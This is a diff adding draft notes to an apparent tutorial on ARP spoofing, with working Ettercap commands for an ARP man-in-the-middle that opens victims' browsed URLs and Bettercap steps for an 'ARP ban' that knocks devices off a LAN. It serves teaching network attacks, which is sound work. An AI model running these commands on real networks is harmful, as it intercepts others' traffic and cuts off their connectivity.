@@ -151,6 +151,29 @@ sudo arping -i $INTERFACE -U -P -S $VICTIM_IP 0.0.0.0
 arpspoof $VICTIM_IP
 ```
 
+> :construction: TK-TODO: This whole section is still just notes.
+> 
+> Automate portions of the above with tooling. Ettercap and Bettercap are the famous tools for this:
+> 
+> * Old demo of Ettercap's `remote_browser` plugin:
+>     1. Make sure you have an appropriately configured `etter.conf`:
+>         * Set `ec_uid` and `ec_gid` to user ID and group ID number you want Ettercap to become, e.g., `ec_uid = 1001`
+>         * Set `remote_browser` to a command that makes sense, such as opening your Web browser, e.g., `remote_browser = "open http://%host%url"`
+>     1. Launch Ettercap in `--text` interface mode, performing an ARP MITM attack that also snarfs packets bound for remote networks (`--mitm arp:remote`) with the `--plugin` for the `remote_browser` activated and a chosen target:
+>         ```sh
+>         # Targets are specified as `[MAC address]/[IPv4 range]/[IPv6 range]/[port range]`
+>         # The three delimiting slashes are required, the values are not. A missing value means "any."
+>         # If `ettercap` complains about the "wrong number" of slashes (`/`), you may have
+>         # a copy that does not have IPv6 support. See `ettercap -h | grep ^TARGET` to check target syntax.
+>         sudo ettercap --text --quiet --mitm arp:remote --plugin remote_browser /192.168.9.10// /192.168.2.1//80
+>         ```
+> * Quick demo of Bettercap's "ARP ban" (spoofs the gateway's MAC address) that knocks a device off the LAN:
+>     1. Launch `bettercap` with `sudo bettercap`
+>     1. Find a target: `net.show`
+>     1. Set the target (otherwise, entire subnet is the target): `set arp.spoof.targets 192.168.9.10-50`
+>     1. Activate the ARP ban hammer: `arp.ban on`
+>     1. End the attack: `arp.ban off`
+
 # Discussion
 
 > :construction: TK-TODO
